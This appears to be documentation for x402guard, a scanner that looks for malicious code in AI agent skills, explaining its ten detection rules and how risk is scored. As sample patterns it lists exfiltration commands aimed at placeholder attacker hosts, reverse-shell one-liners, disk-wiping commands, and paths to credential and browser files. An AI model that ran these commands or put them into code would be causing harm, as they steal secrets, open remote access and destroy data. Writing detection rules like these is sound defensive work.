# Detection Rules: YARA-Style Pattern Matching

x402guard uses YARA-style pattern matching to detect malicious code in AI agent skills. This document describes all 10 detection rules, their severity levels, and the patterns they match.

## Rule Summary

| Rule | Severity | Description |
|------|----------|-------------|
| `credential_theft_env` | CRITICAL | Reading secrets from environment variables |
| `credential_theft_files` | CRITICAL | Accessing credential files |
| `data_exfiltration` | HIGH | Sending data to external servers |
| `destructive_commands` | CRITICAL | Potentially destructive system commands |
| `privilege_escalation` | HIGH | Attempting to gain elevated privileges |
| `code_execution` | HIGH | Dynamic code execution patterns |
| `browser_data_theft` | HIGH | Accessing browser stored data |
| `obfuscation_techniques` | HIGH | Code obfuscation to hide intent |
| `known_exfil_domains` | HIGH | Known data exfiltration services |
| `reverse_shell` | CRITICAL | Remote shell access patterns |

## Severity Levels

| Level | Score Impact | Meaning |
|-------|--------------|---------|
| **CRITICAL** | +40 points | Immediate threat, skill should be blocked |
| **HIGH** | +25 points | Significant risk, careful review needed |
| **MEDIUM** | +15 points | Moderate concern, context matters |
| **LOW** | +5 points | Minor flag, typically informational |

---

## Rule Details

### 1. credential_theft_env

**Severity:** CRITICAL

**Description:** Attempts to read environment variables containing secrets

**What it detects:**
- Direct access to secret environment variables
- Enumeration of all environment variables
- Filtering environment variables for secrets

**Patterns:**

```javascript
// Direct access to secrets
process.env['API_KEY']
process.env.SECRET
process.env.PRIVATE_KEY
process.env.TOKEN
process.env.PASSWORD

// Enumeration
Object.keys(process.env)

// Filtering for secrets
Object.keys(process.env).filter(k => k.includes('KEY'))
```

**Why it's dangerous:** Environment variables often contain API keys, database passwords, and private keys. Legitimate skills should use their own API keys, not enumerate user secrets.

---

### 2. credential_theft_files

**Severity:** CRITICAL

**Description:** Attempts to read credential files

**What it detects:**
- SSH private keys
- Cloud provider credentials
- Package manager configs
- Service account files

**Patterns:**

```javascript
// SSH keys
~/.ssh/id_rsa
~/.ssh/id_ed25519

// Environment files
.env
.env.local

// Cloud credentials
~/.aws/credentials
~/.aws/config
~/.gcloud/
service_account.json
firebase.json

// Other sensitive files
~/.npmrc
~/.netrc
~/.docker/config.json
~/.kube/config
~/.gnupg/
credentials.json
```

**Why it's dangerous:** These files contain authentication credentials that could give attackers access to cloud resources, servers, and services.

---

### 3. data_exfiltration

**Severity:** HIGH

**Description:** Suspicious data transmission to external servers

**What it detects:**
- HTTP POST requests with data
- Webhook service usage
- Data upload patterns

**Patterns:**

```bash
# Shell commands
curl --data "secret=xxx" https://evil.com
wget --post-data "data" https://attacker.com
```

```javascript
// JavaScript patterns
fetch('https://evil.com', { method: 'POST', body: data })
axios.post('https://attacker.com', sensitiveData)
```

**Why it's dangerous:** Combined with credential theft, this pattern allows attackers to send stolen data to servers they control.

---

### 4. destructive_commands

**Severity:** CRITICAL

**Description:** Potentially destructive system commands

**What it detects:**
- File system destruction
- Disk formatting
- Mass deletion

**Patterns:**

```bash
# Linux/Mac
rm -rf /
rm -rf --no-preserve-root /
mkfs.ext4 /dev/sda
dd if=/dev/zero of=/dev/sda

# Windows
format c:
del /s /q C:\
```

**Why it's dangerous:** These commands can cause irreversible data loss and system damage.

---

### 5. privilege_escalation

**Severity:** HIGH

**Description:** Attempts to escalate privileges

**What it detects:**
- sudo usage
- Permission modifications
- Setuid manipulation

**Patterns:**

```bash
# Privilege escalation
sudo rm -rf /
chmod 777 /etc/passwd
chmod +s /bin/sh
runas /user:Administrator cmd
```

**Why it's dangerous:** Privilege escalation allows malware to perform actions beyond normal user permissions.

---

### 6. code_execution

**Severity:** HIGH

**Description:** Dynamic code execution patterns

**What it detects:**
- eval() usage
- Dynamic function creation
- Shell command execution

**Patterns:**

```javascript
// JavaScript dynamic execution
eval(userInput)
new Function('return ' + code)()
exec(command)
spawn('bash', ['-c', command])

// Module usage
require('child_process')
import { exec } from 'child_process'
```

**Why it's dangerous:** Dynamic code execution can run arbitrary code, often used to execute payloads that evade static analysis.

---

### 7. browser_data_theft

**Severity:** HIGH

**Description:** Attempts to access browser data

**What it detects:**
- Cookie access
- Local storage access
- Browser profile data

**Patterns:**

```javascript
// Browser storage
document.cookie
localStorage.getItem('token')
sessionStorage
window.indexedDB

// Browser files (Chromium)
'Chrome/Default/Login Data'
'Chrome/Default/Cookies'
```

**Why it's dangerous:** Browser data contains authentication tokens, session cookies, and cached credentials.

---

### 8. obfuscation_techniques

**Severity:** HIGH

**Description:** Code obfuscation patterns often used to hide malicious intent

**What it detects:**
- Base64 encoding/decoding
- Hex escape sequences
- Character code building
- Array join obfuscation

**Patterns:**

```javascript
// Base64 encoding
atob('bWFsd2FyZQ==')
Buffer.from('data', 'base64')

// Hex escaping
const cmd = '\x72\x6d\x20\x2d\x72\x66'  // "rm -rf"

// Character code building
String.fromCharCode(114, 109, 32, 45, 114, 102)  // "rm -rf"

// Array join
['r','m',' ','-','r','f'].join('')
```

**Why it's dangerous:** Obfuscation is used to hide malicious code from human reviewers and basic scanners.

---

### 9. known_exfil_domains

**Severity:** HIGH

**Description:** Known data exfiltration service domains

**What it detects:**
- Webhook testing services
- Tunneling services
- Out-of-band testing tools

**Patterns:**

```javascript
// Webhook services
fetch('https://webhook.site/abc123')
fetch('https://requestbin.com/xyz')
fetch('https://pipedream.net/@user/endpoint')
fetch('https://hookbin.com/abc')

// Tunneling services
'https://abc123.ngrok.io'
'https://xyz.localhost.run'
'https://serveo.net'

// Security testing (often abused)
'https://burpcollaborator.net'
'https://oast.fun'
```

**Why it's dangerous:** These services are designed to receive arbitrary data, making them ideal for exfiltrating stolen credentials.

---

### 10. reverse_shell

**Severity:** CRITICAL

**Description:** Reverse shell patterns

**What it detects:**
- Netcat shells
- Bash interactive shells
- TCP redirects
- Socket connections

**Patterns:**

```bash
# Netcat
nc -e /bin/bash attacker.com 4444
nc -lvp 4444

# Bash reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
/dev/tcp/10.0.0.1/4444

# Named pipes
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f
```

```javascript
// Node.js
socket.connect(4444, 'attacker.com')
```

**Why it's dangerous:** Reverse shells give attackers remote interactive access to the system.

---

## Interpreting Findings

### Example Finding

```json
{
  "rule": "credential_theft_files",
  "severity": "CRITICAL",
  "description": "Attempts to read credential files",
  "offset": 142,
  "length": 18
}
```

| Field | Meaning |
|-------|---------|
| `rule` | Detection rule that matched |
| `severity` | How dangerous this pattern is |
| `description` | Human-readable explanation |
| `offset` | Byte position in the content where match starts |
| `length` | Length of the matched text |

### Multiple Findings

When multiple rules match, the risk score combines their severities:

```json
{
  "risk_score": 90,
  "findings": {
    "malware": [
      { "rule": "credential_theft_files", "severity": "CRITICAL" },
      { "rule": "data_exfiltration", "severity": "HIGH" },
      { "rule": "known_exfil_domains", "severity": "HIGH" }
    ]
  }
}
```

This skill is trying to read credentials AND send them to an exfiltration service — classic malware behavior.

---

## False Positives

Some patterns may match legitimate code. Context matters:

### Legitimate Uses

```javascript
// This might trigger code_execution, but is legitimate:
const { exec } = require('child_process');
exec('npm install');  // Installing dependencies

// This might trigger obfuscation_techniques, but is legitimate:
const token = Buffer.from(data).toString('base64');  // Encoding for API
```

### Reducing False Positives

1. **Quick tier** — More sensitive, may have false positives
2. **Standard tier** — Balanced detection with context
3. **Deep tier** — Full analysis with behavioral context

If you receive a `CAUTION` recommendation with low risk score (<30), the skill is likely safe but warrants a quick review.

---

## Extending Rules (Self-Hosted)

If you're self-hosting x402guard, you can add custom rules:

```typescript
// server/src/services/auditEngine/yaraScanner.ts

const CUSTOM_RULES: Rule[] = [
  {
    name: "my_company_domains",
    severity: "MEDIUM",
    description: "Unexpected access to internal domains",
    patterns: [
      /internal\.mycompany\.com/gi,
      /\.corp\.mycompany\.com/gi,
    ],
  },
];
```

---

## Next Steps

- [Risk Scoring](./RISK_SCORING.md) — How scores are calculated from findings
- [Skills Explained](./SKILLS_EXPLAINED.md) — What patterns look like in real skills
- [SDK Reference](./SDK_REFERENCE.md) — Using the x402guard client
